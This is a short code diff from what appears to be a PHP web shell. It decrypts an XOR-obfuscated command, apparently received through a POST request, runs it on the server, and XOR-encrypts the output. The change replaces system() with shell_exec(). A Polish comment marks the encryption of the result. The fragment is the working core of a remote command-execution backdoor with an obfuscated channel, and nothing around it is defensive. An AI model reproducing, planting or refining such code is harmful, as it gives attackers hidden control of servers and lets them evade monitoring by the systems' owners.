@@ -33,7 +33,7 @@ $command = xor_string($encrypted, XOR_KEY);
 //$command = base64_decode($_POST['data']);
 
 
-$result = system($command);
+$result = shell_exec($command);
 
 //  Zaszyfruj wynik
 $encrypted_result = xor_string($result, XOR_KEY);
